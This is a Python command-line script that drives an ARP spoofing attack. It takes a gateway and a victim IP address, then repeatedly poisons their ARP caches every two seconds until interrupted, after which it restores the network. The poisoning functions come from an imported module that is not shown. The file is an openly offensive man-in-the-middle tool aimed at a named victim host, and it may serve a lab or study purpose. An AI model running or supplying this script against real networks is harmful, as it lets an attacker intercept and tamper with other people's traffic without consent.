import argparse
from ARP_spoofing import *


def main():
    parser = argparse.ArgumentParser(description='ARP spoof script')
    parser.add_argument('gateway_ip', help='Gateway IP address')
    parser.add_argument('victim_ip', help='Victim IP address')
    args = parser.parse_args()

    gateway_mac = get_mac_address(args.gateway_ip)
    victim_mac = get_mac_address(args.victim_ip)

    try:
        while True:
            arp_poisoning(args.gateway_ip, args.victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print('ARP spoofing stopped, Restoring network')
        restore(args.gateway_ip, args.victim_ip, gateway_mac, victim_mac)
        print('Network restored')


if __name__ == '__main__':
    main()
